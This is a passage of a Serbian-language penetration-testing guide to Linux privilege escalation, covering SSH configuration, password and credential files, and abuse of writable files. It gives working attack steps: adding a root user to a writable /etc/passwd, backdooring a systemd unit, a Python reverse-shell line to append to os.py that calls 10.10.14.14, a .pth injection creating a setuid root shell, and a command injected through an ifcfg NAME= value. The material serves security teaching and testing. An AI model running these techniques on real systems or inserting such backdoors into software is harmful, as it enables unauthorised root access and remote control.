- **`/etc/motd`**: baner nakon prijave (može da otkrije detalje o okruženju ili održavanju).

### PermitRootLogin

Određuje da li root može da se prijavi putem ssh-a. Podrazumevana vrednost u upstream OpenSSH-u je `prohibit-password`; konfiguracija distribucije može je promeniti. Moguće vrednosti:

- `yes`: root može da se prijavi lozinkom ili privatnim ključem
- `without-password` ili `prohibit-password`: root može da se prijavi samo privatnim ključem
- `forced-commands-only`: Root može da se prijavi samo privatnim ključem i ako su navedene opcije za komande
- `no` : ne

### Pouzdani CA-jevi za SSH korisničke sertifikate

`TrustedUserCAKeys` navodi javne ključeve kojima sshd veruje za potpisivanje **korisničkih** sertifikata. Ako je odgovarajući privatni CA ključ čitljiv korisniku sa nižim privilegijama, proverite ko može da dobije sertifikat i za koje naloge bi mogao da se autentifikuje. `AuthorizedPrincipalsFile` ili `AuthorizedPrincipalsCommand` mogu da ograniče prihvaćena imena; ako nijedno nije konfigurisano, sertifikat mora da sadrži ime ciljnog naloga. `PermitRootLogin prohibit-password` blokira autentifikaciju root naloga lozinkom, ali i dalje može da dozvoli autentifikaciju sertifikatom. Sama izložena putanja do ključa ne dokazuje pristup: proverite par javnog i privatnog ključa, efektivna `Match` pravila, politiku naloga, lozinku ključa, opoziv i prihvaćene algoritme potpisa. Ne uključujte bajtove privatnog ključa u izlaz enumeracije. Pogledajte [priručnik za konfiguraciju OpenSSH servera](https://man.openbsd.org/sshd_config#TrustedUserCAKeys).

Privatni CA ključ može da se koristi i **bez mogućnosti čitanja** od strane trenutnog korisnika ako pravilo za delegiranje privilegija dozvoljava tom korisniku da pod identitetom vlasnika ključa pozove neograničeni [potpisivač sertifikata kao što je `ssh-keygen -s`](https://man.openbsd.org/ssh-keygen#-s). Uporedite tačno dozvoljenu komandu i argumente sa pristupom naloga potpisivača ključu, javnim CA ključem kojem veruje efektivna sshd konfiguracija, principal-om prihvaćenim za ciljni nalog, važenjem sertifikata i politikom prijave tog naloga. Delegirana komanda za potpisivanje ili pouzdana CA datoteka same po sebi ne dokazuju pristup drugom nalogu; nemojte potpisivati testni sertifikat tokom pasivne enumeracije.

Za zasebnu putanju poverenja CA-ja po nalogu pogledajte [zabunu oko graničnika principal-a u SSH sertifikatu](../../../network-services-pentesting/pentesting-ssh.md#ssh-certificate-principal-delimiter-confusion).

### AuthorizedKeysFile

Navodi datoteke koje sadrže javne ključeve koji se mogu koristiti za autentifikaciju korisnika. Može da sadrži tokene poput `%h`, koji će biti zamenjeni direktorijumom korisnika. **Možete navesti apsolutne putanje** (koje počinju sa `/`) ili **relativne putanje u odnosu na korisnikov matični direktorijum**. Na primer:

```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```

Ta konfiguracija će značiti da će, ako pokušate da se prijavite pomoću **private** ključa korisnika "**testusername**", ssh uporediti javni ključ vašeg ključa sa ključevima koji se nalaze u `/home/testusername/.ssh/authorized_keys` i `/home/testusername/access`

### ForwardAgent/AllowAgentForwarding

Prosleđivanje SSH agenta omogućava vam da **koristite svoje lokalne SSH ključeve umesto da ostavljate ključeve** (bez passphrase-a!) na serveru. Tako ćete moći da se **jump**-ujete putem ssh-a **na host**, a zatim da se **jump**-ujete **na drugi host** koristeći **ključ** koji se nalazi na vašem **početnom hostu**.

Ovu opciju treba da podesite u `$HOME/.ssh.config` ovako:

```
Host example.com
  ForwardAgent yes
```

Notice that if `Host` is `*`, every time the user connects to a different machine, that host will be able to access the keys (which is a security issue).

The file `/etc/ssh_config` can **override** these **options** and allow or deny this configuration.\
The file `/etc/sshd_config` can **allow** or **deny** ssh-agent forwarding with the keyword `AllowAgentForwarding` (default is allow).

If you find that Agent Forwarding is configured in an environment, read the following page, as **you may be able to abuse it to escalate privileges**:


{{#ref}}
../../user-information/ssh-forward-agent-exploitation.md
{{#endref}}

## Interesting Files

### Profile files

The file `/etc/profile` and the files under `/etc/profile.d/` are **scripts that are executed when a user starts a new shell**. Therefore, if you can **write to or modify any of them, you can escalate privileges**.

```bash
ls -l /etc/profile /etc/profile.d/
```

Ako pronađete neku čudnu profilnu skriptu, trebalo bi da proverite da li sadrži **osetljive informacije**.

### Passwd/Shadow datoteke

U zavisnosti od OS-a, datoteke `/etc/passwd` i `/etc/shadow` mogu imati drugačije ime ili može postojati njihova rezervna kopija. Zato se preporučuje da ih **sve pronađete** i **proverite da li možete da ih pročitate** kako biste videli **da li se u njima nalaze hash vrednosti**:

```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```

U nekim slučajevima možete pronaći **heševe lozinki** u datoteci `/etc/passwd` (ili ekvivalentnoj)

```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```

### Upisiv /etc/passwd

Najpre generišite lozinku jednom od sledećih komandi.

```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```

Zatim dodajte korisnika `hacker` i postavite generisanu lozinku.

```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```

Npr.: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

Sada možete da koristite komandu `su` sa `hacker:hacker`

Alternativno, možete da koristite sledeće linije da dodate lažnog korisnika bez lozinke.\
UPOZORENJE: možete da ugrozite trenutnu bezbednost mašine.

```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```

NAPOMENA: Na BSD platformama, `/etc/passwd` se nalazi u datotekama `/etc/pwd.db` i `/etc/master.passwd`, a `/etc/shadow` je preimenovan u `/etc/spwd.db`.

Trebalo bi da proverite da li možete **da pišete u neke osetljive datoteke**. Na primer, možete li da pišete u neku **konfiguracionu datoteku servisa**?

```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```

Na primer, ako mašina pokreće **tomcat** server i možete da **izmenite konfiguracionu datoteku Tomcat servisa unutar /etc/systemd/,** možete da izmenite linije:

```
ExecStart=/path/to/backdoor
User=root
Group=root
```

Vaš backdoor će biti pokrenut sledeći put kada se Tomcat pokrene.

### Proverite direktorijume

Sledeći direktorijumi mogu sadržati rezervne kopije ili zanimljive informacije: **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (Verovatno nećete moći da pročitate poslednji, ali pokušajte)

```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```

### Neobične lokacije/fajlovi u vlasništvu

```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
      do printf "  Group $g:\n";
      find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
      done
done
```

### Izmenjene datoteke u poslednjih nekoliko minuta

```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```

### SQLite DB datoteke

```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```

U čitljivim bazama podataka aplikacija pregledajte nazive tabela i kolona u potrazi za korisničkim imenima i hash vrednostima lozinki. Pronalaženje hash vrednosti, oporavak lozinke i dokazivanje da se ista lozinka koristi za lokalni nalog odvojeni su koraci; generički 32-znakovni heksadecimalni niz nije dovoljan da bi se zaključilo da je reč o MD5 ili da postoji pristup nalogu.

### \*\_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml files

```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```

Ako čitljiva istorija shell-a sadrži komandu `sudo` praćenu kratkim redom nalik lozinci, ručno pregledajte okolne redove. Lozinka uneta u uobičajeni `sudo` prompt ne čuva se u istoriji shell-a; naredni red je samo mogući slučajan unos u shell, a ne dokaz da je reč o važećoj lozinci. Oznaka `.sudo_as_admin_successful` beleži prethodnu upotrebu, a ne trenutnu autorizaciju.

### Skriveni fajlovi

```bash
find / -type f -iname ".*" -ls 2>/dev/null
```

### **Skripte/binarne datoteke u PATH-u**

```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```

### **Veb datoteke**

```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```

### **Rezervne kopije**

Pregledajte čitljive datoteke u direktorijumima sa rezervnim kopijama, kao i datoteke čiji **nazivi** sadrže `backup`: arhiva sa nečitljivim nazivom ili šifrovanom ekstenzijom i dalje može da otkrije stare podatke aplikacije. Šifrovana arhiva je samo potencijalna izloženost. Oporavak lozinke, pregled njenog sadržaja, oporavak hash-a aplikacije i ponovna upotreba te lozinke za Unix nalog odvojeni su koraci koje treba proveriti; hash u arhivi ne potvrđuje mogućnost lokalnog prijavljivanja.

Čitljive rezervne kopije virtuelnih mašina zaslužuju isti pregled. VirtualBox `.vbox` konfiguracija može da identifikuje prikačene `.vdi` slike i da sadrži metapodatke o ključu šifrovanog diska; [VirtualBox navodi da se šifrovani ključ podataka čuva u konfiguraciji VM-a](https://docs.oracle.com/en/virtualization/virtualbox/7.0/user/AdvancedTopics.html). I konfiguracija i slika moraju biti dostupne da bi bio moguć pregled diska van mreže. Gostujući volumen može imati sopstveni [LUKS sloj šifrovanja](https://gitlab.com/cryptsetup/cryptsetup/-/blob/main/man/cryptsetup.8.adoc), za koji je potreban zaseban ključ. Čak i nakon odobrenog dešifrovanja, stare skripte ili konfiguracija mogu sadržati lozinku; utvrdite da li je akreditiv i dalje važeći za nalog na hostu i da li njegova efektivna `sudo` politika dozvoljava privilegovanu komandu pre nego što ovo proglasite lokalnom eskalacijom privilegija. Tokom pasivnog popisivanja evidentirajte putanje i dozvole bez kopiranja, dešifrovanja ili priključivanja slika.

Pri pregledu čitljive arhive, prvo izlistajte nazive članova pre nego što išta raspakujete: skrivene datoteke za autentifikaciju, materijal sa kodovima za oporavak ili SSH ključevi mogu biti prisutni čak i ako su aktivne kopije zaštićene. Nazivi datoteka samo ukazuju na mogući trag; zasebno proverite materijal i eventualnu ponovnu upotrebu naloga.

Dajte prednost **čitljivim arhivama u vlasništvu drugog korisnika** u direktorijumima sa rezervnim kopijama, naročito arhivama u vlasništvu root-a i onima kojima se može pristupiti putem članstva u grupi. Стара архива може да садржи конфигурацију или тајну за аутентификацију чак и када је активна копија заштићена. Za lokalni interfejs za upravljanje rezervnim kopijama kao što je [Backrest](https://garethgeorge.github.io/backrest/), proverite efektivni nalog servisa i da li korisnik sa nižim privilegijama može da čita njegovu konfiguraciju ili da se autentifikuje u interfejs. Njegove [hooks](https://garethgeorge.github.io/backrest/docs/hooks) i [restic komandni interfejs](https://github.com/garethgeorge/backrest/blob/main/proto/v1/service.proto) mogu da rade sa privilegijama servisa za pristup datotekama i izvršavanje komandi; listener vezan samo za loopback sam po sebi ne određuje uticaj. Backrest-ov `passwordBcrypt` je bcrypt hash kodiran u base64 formatu, a ne lozinka u čistom tekstu, kako je prikazano u njegovom [kodu za autentifikaciju](https://github.com/garethgeorge/backrest/blob/main/internal/auth/auth.go). Potvrdite identitet servisa, upotrebljive akreditive i pristup relevantnom planu ili repozitorijumu pre nego što izloženu arhivu ili interfejs smatrate granicom privilegija.

```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```

### Poznate datoteke koje sadrže lozinke

Pročitajte kod [**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS); alat pretražuje **nekoliko mogućih datoteka koje mogu sadržati lozinke**.\
**Još jedan zanimljiv alat** koji možete koristiti za to je [**LaZagne**](https://github.com/AlessandroZ/LaZagne), aplikacija otvorenog koda koja služi za pronalaženje brojnih lozinki sačuvanih na lokalnom računaru sa Windowsom, Linuxom ili Macom.

Ako je `/etc/guacamole/guacamole.properties` čitljiv, pregledajte njegove postavke povezivanja sa bazom podataka `mysql-*`, `postgresql-*` ili `sqlserver-*`. Ako je nalog ovlašćen da čita Guacamole JDBC tabele, `guacamole_connection_parameter` može sadržati sačuvane vrednosti za SSH parametre `username`, `password`, `private-key` ili `passphrase`. Počnite od ID-jeva veza i naziva parametara, pa pregledajte samo relevantne redove; sačuvana vrednost može biti dinamički token ili referenca na vault, a ne ponovo upotrebljiva tajna. Pogledajte [Guacamole JDBC šemu](https://guacamole.apache.org/doc/gug/jdbc-auth-schema.html) i [SSH parametre povezivanja](https://guacamole.apache.org/doc/gug/configuring-guacamole.html).

[pswm upravljač lozinkama](https://github.com/Julynx/pswm#usage) podrazumevano čuva šifrovani vault u putanji `~/.local/share/pswm/pswm`. Ako možete da vidite vault drugog korisnika, proverite njegovo vlasništvo i da li vaš nalog zaista može da ga čita. Sama putanja do vaulta ne otkriva pristupne podatke; oporavak glavne lozinke, pronalaženje ponovo upotrebljive lozinke za nalog i potvrda privilegija tog naloga zasebni su koraci.

[Podrazumevana Passpie baza podataka](https://passpie.readthedocs.io/en/latest/faq.html#what-is-a-passpie-database) nalazi se u `~/.passpie/`, sa privezkom ključeva `.keys` i šifrovanim datotekama pristupnih podataka `.pass` u direktorijumima grupa. Vidljiv direktorijum baze podataka samo je trag do putanje: potvrdite pristup ključu i relevantnom šifrovanom unosu, proverite da li je potrebna glavna lozinka i utvrdite da li oporavljeni pristupni podatak pripada privilegovanijem nalogu. Passpie podržava i [prilagođene putanje do baza podataka](https://passpie.readthedocs.io/en/latest/getting_started.html#multiple-databases), zato podrazumevana putanja nije sveobuhvatna. Automatizovano nabrajanje treba da prikazuje metapodatke bez izvoza pristupnih podataka ili ispisivanja materijala ključeva.

### Dnevnici

Ako možete da čitate dnevnike, možda ćete u njima pronaći **zanimljive/poverljive informacije**. Što je dnevnik neobičniji, to će verovatno biti zanimljiviji.\
Takođe, neke **loše** konfigurisane (sa backdoorom?) **revizijske dnevnike** možda je moguće podesiti tako da **beleže lozinke**, kao što je objašnjeno u ovom postu: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).<sup>[[36]](#references)</sup>

```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```

Da biste mogli da čitate logove, grupa [**adm**](../../user-information/interesting-groups-linux-pe/index.html#adm-group) će biti veoma korisna.

### Shell fajlovi

```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```

### Generička pretraga kredencijala/Regex

Takođe bi trebalo da proverite da li postoje fajlovi koji u **nazivu** ili u **sadržaju** sadrže reč "**password**", kao i da potražite IP adrese, imejl adrese i regex obrasce za hash vrednosti u logovima.\
Neću ovde navoditi kako se sve to radi, ali ako vas zanima, možete da pogledate poslednje provere koje obavlja [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh).

## Fajlovi sa dozvolom za pisanje

### Python library hijacking

Ako znate **odakle** će se pokrenuti Python skripta i **možete da pišete u** taj direktorijum ili da **menjate Python biblioteke**, možete da izmenite OS biblioteku i ubacite joj backdoor (ako možete da pišete u direktorijum iz kog će se pokrenuti Python skripta, kopirajte i nalepite biblioteku os.py).

Da biste **ubacili backdoor u biblioteku**, samo dodajte sledeći red na kraj biblioteke os.py (promenite IP i PORT):

```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```

#### Obradivi `.pth` fajl koji obrađuje `site.addsitedir()`

Nemojte tretirati `site.addsitedir(DIR)` kao ekvivalent za `sys.path.append(DIR)`. Ova funkcija obrađuje i svaki `*.pth` fajl u direktorijumu `DIR`. Red koji počinje sa `import`, iza kog sledi razmak ili tabulator, izvršava se kao Python kod. Redovi sa putanjama se umesto toga razrešavaju u odnosu na direktorijum sajta i dodaju samo ako te putanje postoje.<sup>[[38]](#references)</sup>

Ovo dovodi do eskalacije privilegija kada Python program koji je dozvoljen preko `sudo` ili ima druge privilegije pozove `site.addsitedir()` nad direktorijumom u koji trenutni korisnik ili neka od njegovih grupa mogu da upisuju. Kod iz `.pth` fajla izvršava se dok privilegovani program podešava putanju za uvoz, pre nego što se pokrene njegova uobičajena radnja.<sup>[[38]](#references)[[39]](#references)</sup>

```bash
# Find explicit consumers and inspect every selected directory's ownership
grep -R "site\.addsitedir" /opt /usr/local 2>/dev/null
namei -l /opt/app/plugins/dev
find /opt/app/plugins/dev -maxdepth 1 -type f -name '*.pth' -ls

# Verify execution through a one-line path configuration file
printf '%s\n' "import os; os.system('id')" > /opt/app/plugins/dev/probe.pth
sudo /usr/bin/python3 /opt/app/controller.py status
```

Izvršni sadržaj `.pth` datoteke mora stati u jedan red, ali tačka-zarez omogućava više naredbi. Na primer, putanja izvršavanja sa root privilegijama može da napravi setuid kopiju Bash-a; pokrenite Bash sa `-p` da bi zadržao svoj efektivni ID.<sup>[[39]](#references)</sup>

```bash
printf '%s\n' "import os; os.system('cp /bin/bash /tmp/rootshell; chmod 4755 /tmp/rootshell')" \
  > /opt/app/plugins/dev/pwn.pth
sudo /usr/bin/python3 /opt/app/controller.py status
/tmp/rootshell -p
```

Opcija `-S` samo onemogućava Python-ovu automatsku inicijalizaciju `site`. Ne štiti program koji eksplicitno uvozi `site` i poziva `site.addsitedir()`. Uklonite direktorijume u koje napadač može da upisuje iz privilegovanih putanja za uvoz i zahtevajte da privilegovani administrator bude vlasnik direktorijuma i njegovih `.pth` datoteka i da samo on može da upisuje u njih.<sup>[[38]](#references)[[39]](#references)</sup>

### Eksploatacija logrotate-a

Privilegovani `logrotate` posao može da omogući upisivanje datoteke između korisnika kada zaista rotira log ispod direktorijuma koji korisnik sa nižim privilegijama može da zameni ili preusmeri tokom rotacije. Log u koji može da se upisuje samo je trag za proveru. Potvrdite tačno aktivno pravilo i njegove direktive `create`, `olddir` i `su`; efektivni identitet raspoređivača; prava upisivanja i pretrage na nadređenom direktorijumu loga; kao i to da li instalirana verzija i pravila dozvoljavaju promenu odredišta. Da bi upis u startup datoteku doveo do izvršavanja komandi, kasnija privilegovana ljuska mora da učita i rezultujuću datoteku. Pregledajte raspored, pravilo, verziju/pakovanje i metapodatke putanje, bez pokretanja rotacije ili pokušaja iskorišćavanja race uslova.

> [!TIP]
> Nemojte smatrati `3.18.0` ili bilo koji drugi broj verzije samostalnim kriterijumom za procenu mogućnosti eksploatacije. [Dnevnik izmena upstream projekta](https://github.com/logrotate/logrotate/blob/main/ChangeLog.md) beleži ojačavanje zaštite direktorijuma i symlink-ova u više izdanja, a distribucije mogu da prenesu ispravke u starije verzije. [Upstream priručnik](https://github.com/logrotate/logrotate/blob/main/logrotate.8.in) preporučuje `su` kada root rotira logove u direktorijumima kojima upravljaju neprivilegovani korisnici; proverite efektivno pravilo i stvarno ponašanje.

Detaljnije informacije o ranjivosti možete pronaći na ovoj stranici: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).<sup>[[37]](#references)</sup>

Ovu ranjivost možete da iskoristite pomoću alata [**logrotten**](https://github.com/whotwagner/logrotten).

Ova ranjivost je veoma slična ranjivosti [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(nginx logovi)**, pa kad god utvrdite da možete da menjate logove, proverite ko njima upravlja i da li možete da eskalirate privilegije tako što ćete logove zameniti symlink-ovima.

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**Referenca za ranjivost:** [**https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f).<sup>[[20]](#references)</sup>

Datoteka `ifcfg-*` predstavlja trag za proveru ako korisnik sa nižim privilegijama može da je kreira ili izmeni **i** ako će je privilegovani put aktivacije mreže zaista pročitati. Potvrdite efektivne dozvole datoteke i direktorijuma, izabrani interfejs, instaliranu implementaciju `ifup`/`ifdown` i ko je poziva. Sama mogućnost upisivanja u datoteku ne dovodi do izvršavanja. [Red Hat-ov vodič za umrežavanje u RHEL 7](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/7/html/networking_guide/sec-using_networkmanager_with_sysconfig_files) razlikuje zastarele network scripts od NetworkManager-a: ovaj drugi sam po sebi ne pokreće prve. [Dokumentacija za RHEL 8](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/8/html/configuring_and_managing_networking/assembly_legacy-network-scripts-support-in-rhel_configuring-and-managing-networking) navodi da njegov podrazumevani `ifup`/`ifdown` koristi NetworkManager, dok opcioni zastareli paket obezbeđuje shell skripte.

Na sistemu koji zaista koristi privilegovane zastarele skripte, nequoted `ifcfg-*` dodela koja se učitava kao shell, kao što je `NAME=`, može da pređe granicu izvršavanja koda. Proverite tačan parser, vrednost i put aktivacije; nemojte zaključivati da se vrednost tumači kao shell samo na osnovu imena datoteke ili prisustva NetworkManager-a. Wrapper dozvoljen preko sudo-a koji upisuje korisnički unos u datoteku `ifcfg-*`, a zatim poziva zastareli `ifup`, predstavlja zaseban put do ove granice, čak i kada pozivalac ne može direktno da menja datoteku.

Na primer: _/etc/sysconfig/network-scripts/ifcfg-1337_

```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```

(_Napomena: obratite pažnju na razmak između Network i /bin/id_)

### **init, init.d, systemd i rc.d**

Direktorijum `/etc/init.d` sadrži **skripte** za System V init (SysVinit), **klasični Linux sistem za upravljanje servisima**. Uključuje skripte za `start`, `stop`, `restart` i ponekad `reload` servisa. Mogu se izvršavati direktno ili preko simboličkih veza u `/etc/rc?.d/`. Alternativna putanja u Redhat sistemima je `/etc/rc.d/init.d`.

S druge strane, `/etc/init` je povezan sa **Upstart-om**, novijim sistemom za **upravljanje servisima** koji je uveo Ubuntu i koristi konfiguracione fajlove za zadatke upravljanja servisima. Uprkos prelasku na Upstart, SysVinit skripte se i dalje koriste uporedo sa Upstart konfiguracijama zbog sloja za kompatibilnost u Upstart-u.

**systemd** je moderan sistem za inicijalizaciju i upravljanje servisima, koji nudi napredne funkcije kao što su pokretanje demona na zahtev, upravljanje automatskim montiranjem i snimci stanja sistema. Organizuje fajlove u `/usr/lib/systemd/` za pakete distribucije i `/etc/systemd/system/` za izmene administratora, pojednostavljujući administraciju sistema.<sup>[[21]](#references)</sup>

## Ostali trikovi

### NFS eskalacija privilegija


{{#ref}}
../../interesting-files-permissions/nfs-no_root_squash-misconfiguration-pe.md
{{#endref}}

### Izlazak iz ograničenih Shell-ova


{{#ref}}
../../main-system-information/escaping-from-limited-bash.md
{{#endref}}

### Cisco - vmanage


{{#ref}}
../../network-information/cisco-vmanage.md
{{#endref}}

## Android rooting frameworks: zloupotreba manager-channel-a

Android rooting frameworks obično zakače syscall kako bi userspace manager-u izložili privilegovanu funkcionalnost kernela. Slaba autentifikacija manager-a (npr. provere potpisa zasnovane na redosledu FD-ova ili slabe šeme lozinki) može omogućiti lokalnoj aplikaciji da se predstavi kao manager i eskalira privilegije do root-a na već root-ovanim uređajima. Više informacija i detalje eksploatacije potražite ovde:


{{#ref}}
../../software-information/android-rooting-frameworks-manager-auth-bypass-syscall-hook.md
{{#endref}}

## VMware Tools service discovery LPE (CWE-426) putem exec-a zasnovanog na regex-u (CVE-2025-41244)

Otkrivanje servisa zasnovano na regex-u u VMware Tools/Aria Operations može izdvojiti putanju binarne datoteke iz komandnih linija procesa i izvršiti je sa -v u privilegovanom kontekstu. Previše permisivni obrasci (npr. upotreba \S) mogu se podudarati sa attacker-staged listener-ima na lokacijama sa dozvolom za pisanje (npr. /tmp/httpd), što dovodi do izvršavanja kao root (CWE-426 Untrusted Search Path).<sup>[[27]](#references)</sup>

Više informacija i uopšteni obrazac primenljiv na druge stekove za otkrivanje/nadgledanje potražite ovde:

{{#ref}}
../../main-system-information/kernel-lpe-cves/vmware-tools-service-discovery-untrusted-search-path-cve-2025-41244.md
{{#endref}}

## Bezbednosne zaštite kernela

- [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
- [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## Dodatna pomoć

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Linux/Unix alati za Privesc

### **Najbolji alat za traženje lokalnih vektora za eskalaciju privilegija na Linux-u:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(-t opcija)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** Enumeriše kernel ranjivosti u Linux-u i MAC-u [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local_exploit_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (fizički pristup):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**Kompilacija dodatnih skripti**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)



## References

- [1] [0xdf – HTB Planning (eskalacija privilegija putem Crontab UI-ja, ponovna upotreba zip -P kredencijala)](https://0xdf.gitlab.io/2025/09/13/htb-planning.html)
- [2] [0xdf – HTB Era: falsifikovani .text_sig payload za monitor koji pokreće cron](https://0xdf.gitlab.io/2025/11/29/htb-era.html)
- [3] [0xdf – Holiday Hack Challenge 2025: zaobilaženje Neighborhood Watch-a (otimanje sudo env_keep PATH-a)](https://0xdf.gitlab.io/holidayhack2025/act1/neighborhood-watch)
- [4] [alseambusher/crontab-ui](https://github.com/alseambusher/crontab-ui)
- [5] [Osnovna eskalacija privilegija na Linux-u](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- [6] [Vodič za eskalaciju privilegija na Linux-u](https://payatu.com/guide-linux-privilege-escalation/)
- [7] [Napad i odbrana: tehnike eskalacije privilegija na Linux-u iz 2016.](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)
- [8] [Niko ne očekuje izvršavanje komandi!](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)
- [9] [Sudo (LD_PRELOAD) (eskalacija privilegija na Linux-u)](https://touhidshaikh.com/blog/?p=827)
- [10] [lpeworkshop – vodič kroz laboratorijske vežbe - Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)
- [11] [frizb/Linux-Privilege-Escalation: saveti i trikovi za eskalaciju privilegija na Linux-u](https://github.com/frizb/Linux-Privilege-Escalation)
- [12] [lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)
- [13] [rtcrowley/linux-private-i: alat za enumeraciju i eskalaciju privilegija na Linux-u](https://github.com/rtcrowley/linux-private-i)
- [14] [Šta je Socket?](https://www.linux.com/news/what-socket/)
